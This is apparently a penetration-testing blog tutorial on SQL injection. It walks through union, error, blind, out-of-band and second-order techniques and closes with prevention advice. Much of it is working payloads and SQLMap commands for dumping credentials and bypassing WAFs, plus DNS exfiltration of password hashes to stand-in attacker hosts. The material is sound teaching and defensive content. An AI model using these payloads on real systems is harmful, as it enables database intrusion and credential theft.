SQL Injection Deep Dive: Techniques, Payloads & Prevention

📅 Feb 20, 2024 ⏱ 12 min read
#sql-injection #sqli #web #owasp #database

SQL Injection (SQLi) has topped the OWASP Top 10 for over a decade and remains one of the most devastating vulnerability classes a web application can suffer. A single injectable parameter can expose an entire database, enable server-side file reads, or — in the worst cases — lead to full operating-system compromise. In this deep dive we'll dissect every major SQLi technique, walk through real payloads, and finish with the defensive controls that actually work.

⚠️ Disclaimer: All techniques and payloads discussed here are for authorized penetration testing and educational purposes only. Never test systems you do not own or have explicit written permission to assess.

What Is SQL Injection?

SQL Injection occurs when user-supplied data is concatenated directly into an SQL query without proper sanitization or parameterization. The database engine has no way to distinguish between the developer's intended query structure and attacker-controlled data, so it faithfully executes whatever SQL the attacker injects.

Consider a classic login form that builds its query like this (pseudo-PHP):

-- Vulnerable query construction
$query = "SELECT * FROM users
          WHERE username = '" . $_POST['username'] . "'
          AND password  = '" . $_POST['password'] . "'";

If an attacker supplies ' OR '1'='1 as the username, the resulting query becomes:

SELECT * FROM users
WHERE username = '' OR '1'='1'
AND password  = 'anything';

Because '1'='1' is always true, every row in the users table is returned and the attacker is authenticated as the first user — often the administrator.

Types of SQL Injection

SQLi is broadly split by how results are communicated back to the attacker.

In-Band SQLi (Classic)

The injected data and the exfiltrated data travel over the same HTTP channel. This is the easiest type to exploit because results appear directly in the application's response. The two main sub-types are Union-based and Error-based.

Blind SQLi

No data is echoed back in the response, but the attacker can infer information by asking the database true/false questions (Boolean-based blind) or by measuring response time (Time-based blind).

Out-of-Band SQLi

Data is exfiltrated over a secondary channel — DNS lookups or HTTP requests triggered by database-specific functions (e.g., LOAD_FILE(), UTL_HTTP in Oracle). This is the stealthiest form and depends heavily on the database engine's capabilities and network permissions.

Union-Based Extraction

UNION-based injection appends a second SELECT statement to the original query. For this to work, the injected SELECT must return the same number of columns with compatible data types.

Step 1 — Find the Column Count

Use ORDER BY incrementally until the application throws an error, then subtract one:

-- Increment until error
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   <-- error here → the query has 2 columns

Step 2 — Find Printable Columns

Replace column positions with NULL and swap in string literals one at a time to find which columns render in the response:

-- Probe which columns are reflected in the output
' UNION SELECT NULL,NULL--
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--

-- Once you know column 2 is printable:
' UNION SELECT NULL,@@version--          -- MySQL/MSSQL
' UNION SELECT NULL,version()--          -- PostgreSQL

Step 3 — Dump the Schema

-- List all tables in the current database (MySQL)
' UNION SELECT NULL,GROUP_CONCAT(table_name SEPARATOR ', ')
  FROM information_schema.tables
  WHERE table_schema=database()--

-- List columns of the users table
' UNION SELECT NULL,GROUP_CONCAT(column_name SEPARATOR ', ')
  FROM information_schema.columns
  WHERE table_name='users'--

-- Dump credentials
' UNION SELECT username,password FROM users--

Error-Based Extraction

Some databases expose detailed error messages that include query results. This lets an attacker extract data in a single request by embedding a subquery inside a function that forces an error containing the subquery's output.

-- MySQL: extractvalue() trick
' AND extractvalue(1,concat(0x7e,(SELECT database())))--
-- Response: XPATH syntax error: '~targetdb'

-- MySQL: updatexml() trick
' AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password)
  FROM users)),1)--

-- MSSQL: convert() trick
'; SELECT CONVERT(int, (SELECT TOP 1 table_name
  FROM information_schema.tables))--

Boolean-Based Blind SQLi

When the application returns two distinct responses (e.g., a result page vs. a "not found" page) but never echoes data, an attacker can ask yes/no questions and extract data character by character.

-- Does the database name start with 'a'?
' AND SUBSTRING(database(),1,1)='a'--   -- false response
' AND SUBSTRING(database(),1,1)='t'--   -- true response → first char is 't'

-- Extract the full database name one byte at a time
' AND ASCII(SUBSTRING(database(),1,1))>64--
' AND ASCII(SUBSTRING(database(),1,1))>96--
' AND ASCII(SUBSTRING(database(),1,1))>115--
' AND ASCII(SUBSTRING(database(),1,1))=116--  -- 't' confirmed

-- Check if admin password hash starts with specific chars
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='5'--

Automating this manually is tedious — each character requires up to 8 binary-search requests. That's where SQLMap shines (see below).

Time-Based Blind SQLi

When the application returns an identical response regardless of whether the injected condition is true or false, you can use deliberate time delays to encode information: a slow response means "true", a fast response means "false".

-- MySQL: SLEEP()
' AND SLEEP(5)--                         -- always delays 5 s (confirm injection)
' AND IF(1=1,SLEEP(5),0)--              -- delays only when condition is true
' AND IF(SUBSTRING(database(),1,1)='t',SLEEP(5),0)--

-- PostgreSQL: pg_sleep()
'; SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0)
  END FROM users--

-- MSSQL: WAITFOR DELAY
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')>0
  WAITFOR DELAY '0:0:5'--

-- Oracle: heavy query (no sleep function in older versions)
' AND 1=(SELECT COUNT(*) FROM ALL_OBJECTS,ALL_OBJECTS,ALL_OBJECTS)--

Use a threshold of ~3–4 seconds to distinguish network latency from genuine delays. Always confirm with multiple requests before drawing conclusions.

Automated Exploitation with SQLMap

SQLMap is the industry-standard open-source tool for detecting and exploiting SQL injection. It automates everything from fingerprinting the DBMS to dumping tables and even spawning OS shells when conditions permit.

Basic Detection

# Test a GET parameter
sqlmap -u "https://target.example.com/item?id=1" --batch

# Test a POST parameter
sqlmap -u "https://target.example.com/login" \
       --data="username=admin&password=test" \
       --batch

# Supply cookies for authenticated pages
sqlmap -u "https://target.example.com/profile?id=5" \
       --cookie="PHPSESSID=abc123def456" \
       --batch

DBMS Fingerprinting & Data Extraction

# Identify DBMS, version, current user and database
sqlmap -u "https://target.example.com/item?id=1" \
       --fingerprint --current-db --current-user --batch

# Enumerate databases, then tables
sqlmap -u "https://target.example.com/item?id=1" \
       --dbs --batch
sqlmap -u "https://target.example.com/item?id=1" \
       -D targetdb --tables --batch

# Dump a specific table
sqlmap -u "https://target.example.com/item?id=1" \
       -D targetdb -T users --dump --batch

# Crack password hashes on the fly
sqlmap -u "https://target.example.com/item?id=1" \
       -D targetdb -T users --dump \
       --passwords --batch

Bypassing WAFs & Filters

# Use tamper scripts to obfuscate payloads
sqlmap -u "https://target.example.com/item?id=1" \
       --tamper=space2comment,between,randomcase \
       --level=5 --risk=3 --batch

# Specify injection technique explicitly
sqlmap -u "https://target.example.com/item?id=1" \
       --technique=T \   # T = time-based only
       --dbms=mysql \
       --batch

# Throttle requests to evade rate-limiting
sqlmap -u "https://target.example.com/item?id=1" \
       --delay=2 --timeout=30 --retries=3 --batch

Out-of-Band Techniques

When in-band and blind channels are both blocked, OOB exfiltration via DNS is often still possible. The database server makes an outbound DNS lookup for an attacker-controlled domain, embedding data in the subdomain label.

-- MySQL: requires FILE privilege and outbound DNS
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users
  WHERE username='admin'),'.attacker.burpcollaborator.net\\share\\'))--

-- MSSQL: xp_dirtree (no special privilege needed if xp_dirtree is enabled)
'; EXEC master..xp_dirtree
  '\\' + (SELECT TOP 1 password FROM users) + '.attacker.example.com\share'--

Tools like Burp Collaborator or interactsh provide free OOB interaction servers that log DNS and HTTP callbacks in real time.

Second-Order (Stored) SQLi

Second-order injection occurs when malicious input is safely stored the first time but then incorporated unsafely into a query at a later point — for example, when updating a profile. A username like admin'-- may be inserted harmlessly, but when that same value is pulled from the database and placed directly into an UPDATE query, injection fires.

-- Registration step (safe — parameterized insert)
INSERT INTO users (username, password) VALUES ('admin\'--', 'hunter2');

-- Password-change step (vulnerable — username retrieved from DB then concatenated)
UPDATE users
SET password = 'newpass'
WHERE username = 'admin'--'   -- comment drops the rest of the WHERE clause
-- Attacker just changed the admin's password!

Second-order flaws are notoriously easy to miss in code review because the vulnerable query is far removed from the injection point.

Prevention & Mitigation

The good news: SQLi is almost entirely preventable with the right coding patterns applied consistently.

1. Parameterized Queries (Prepared Statements)

This is the primary and most effective defense. The query structure is sent to the database engine separately from the data, making it impossible for user input to alter query logic.

-- ❌ Vulnerable: string concatenation
query = "SELECT * FROM users WHERE username = '" + username + "'"

-- ✅ Safe: parameterized (Python psycopg2 example)
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)
)

-- ✅ Safe: prepared statement (Java JDBC)
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?"
);
stmt.setString(1, username);
stmt.setString(2, password);

2. Stored Procedures (Used Carefully)

Stored procedures encapsulate SQL on the server side, but they are only safe when they themselves use parameterized queries internally — not dynamic SQL concatenation.

3. Input Validation & Allow-lists

Validate that input conforms to the expected format (e.g., an integer ID must be a digit, a username must match ^[a-zA-Z0-9_]{3,32}$). For values like column names or sort directions that must be dynamic, use strict server-side allow-lists — never reflect the raw user input into the query.

4. Principle of Least Privilege

The database user your application connects with should have only the permissions it actually needs: typically SELECT, INSERT, UPDATE, DELETE on specific tables. It should never have DROP, CREATE, GRANT, FILE, or EXECUTE privileges unless absolutely required.

5. Web Application Firewall (WAF)

A WAF adds a detection layer that can block known SQLi patterns. However, WAFs are a complementary control, not a substitute for fixing the root cause. Skilled attackers routinely bypass WAFs using encoding tricks, HTTP parameter pollution, and chunked transfer encoding. Fix the code; use the WAF as a backstop.

6. Error Handling

Never expose raw database error messages to the end user. They reveal table names, column names, and DBMS version — all invaluable to an attacker. Log errors server-side and return a generic message to the client.

7. Regular Security Testing

Run automated DAST scanners (SQLMap, Burp Suite Pro, OWASP ZAP) as part of your CI/CD pipeline. Conduct manual penetration tests on a regular cadence, especially after significant code changes. Add SQLi test cases to your unit and integration test suites.

Closing Thoughts

SQL Injection endures because developers continue to trust user input. The fix has been known for decades — parameterized queries — yet SQLi vulnerabilities still surface in code shipped in 2024. The techniques covered here range from a simple authentication bypass to full OS compromise; the common thread is unsanitized data reaching the SQL interpreter.

As a penetration tester, mastering SQLi means understanding not just the payloads but the underlying database engine behavior: how MySQL differs from PostgreSQL, which functions require elevated privileges, and how WAF bypass works. As a developer, the takeaway is simpler: never concatenate user input into a query. Use parameterized statements everywhere, least-privilege database accounts, and you'll eliminate this vulnerability class entirely.

Happy hunting — responsibly. 🔐
